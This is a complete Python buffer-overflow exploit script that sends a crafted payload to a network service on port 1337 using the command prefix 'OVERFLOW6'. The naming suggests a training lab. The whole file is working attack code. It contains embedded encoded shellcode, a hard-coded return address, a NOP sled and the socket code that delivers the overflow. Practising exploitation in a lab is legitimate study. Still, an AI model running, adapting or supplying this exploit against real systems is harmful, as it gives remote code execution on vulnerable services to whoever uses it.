#!/usr/bin/python3
import socket
ip = "10.10.146.149"

#2500 max buffer
port = 1337
timeout = 5
prefix = b"OVERFLOW6 "
buf =  b""
buf += b"\xba\xbe\x46\xc3\x16\xda\xdf\xd9\x74\x24\xf4\x5e\x31"
buf += b"\xc9\xb1\x52\x31\x56\x12\x83\xee\xfc\x03\xe8\x48\x21"
buf += b"\xe3\xe8\xbd\x27\x0c\x10\x3e\x48\x84\xf5\x0f\x48\xf2"
buf += b"\x7e\x3f\x78\x70\xd2\xcc\xf3\xd4\xc6\x47\x71\xf1\xe9"
buf += b"\xe0\x3c\x27\xc4\xf1\x6d\x1b\x47\x72\x6c\x48\xa7\x4b"
buf += b"\xbf\x9d\xa6\x8c\xa2\x6c\xfa\x45\xa8\xc3\xea\xe2\xe4"
buf += b"\xdf\x81\xb9\xe9\x67\x76\x09\x0b\x49\x29\x01\x52\x49"
buf += b"\xc8\xc6\xee\xc0\xd2\x0b\xca\x9b\x69\xff\xa0\x1d\xbb"
buf += b"\x31\x48\xb1\x82\xfd\xbb\xcb\xc3\x3a\x24\xbe\x3d\x39"
buf += b"\xd9\xb9\xfa\x43\x05\x4f\x18\xe3\xce\xf7\xc4\x15\x02"
buf += b"\x61\x8f\x1a\xef\xe5\xd7\x3e\xee\x2a\x6c\x3a\x7b\xcd"
buf += b"\xa2\xca\x3f\xea\x66\x96\xe4\x93\x3f\x72\x4a\xab\x5f"
buf += b"\xdd\x33\x09\x14\xf0\x20\x20\x77\x9d\x85\x09\x87\x5d"
buf += b"\x82\x1a\xf4\x6f\x0d\xb1\x92\xc3\xc6\x1f\x65\x23\xfd"
buf += b"\xd8\xf9\xda\xfe\x18\xd0\x18\xaa\x48\x4a\x88\xd3\x02"
buf += b"\x8a\x35\x06\x84\xda\x99\xf9\x65\x8a\x59\xaa\x0d\xc0"
buf += b"\x55\x95\x2e\xeb\xbf\xbe\xc5\x16\x28\xcb\x12\x29\x59"
buf += b"\xa3\x26\x49\x88\x68\xae\xaf\xc0\x80\xe6\x78\x7d\x38"
buf += b"\xa3\xf2\x1c\xc5\x79\x7f\x1e\x4d\x8e\x80\xd1\xa6\xfb"
buf += b"\x92\x86\x46\xb6\xc8\x01\x58\x6c\x64\xcd\xcb\xeb\x74"
buf += b"\x98\xf7\xa3\x23\xcd\xc6\xbd\xa1\xe3\x71\x14\xd7\xf9"
buf += b"\xe4\x5f\x53\x26\xd5\x5e\x5a\xab\x61\x45\x4c\x75\x69"
buf += b"\xc1\x38\x29\x3c\x9f\x96\x8f\x96\x51\x40\x46\x44\x38"
buf += b"\x04\x1f\xa6\xfb\x52\x20\xe3\x8d\xba\x91\x5a\xc8\xc5"
buf += b"\x1e\x0b\xdc\xbe\x42\xab\x23\x15\xc7\xcb\xc1\xbf\x32"
buf += b"\x64\x5c\x2a\xff\xe9\x5f\x81\x3c\x14\xdc\x23\xbd\xe3"
buf += b"\xfc\x46\xb8\xa8\xba\xbb\xb0\xa1\x2e\xbb\x67\xc1\x7a"

returnAdd = b"\xaf\x11\x50\x62"
NOP = b"\x90" * 20
buffer = b"A" * 1034 + returnAdd + NOP + buf + b"D" * (2500 - 1034 - len(buf) - len(NOP))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect((ip, port))
resp = s.recv(1024)
print(resp)
s.send(prefix + buffer + b"\r\n")
resp = s.recv(1024)
print(resp)

s.close()	

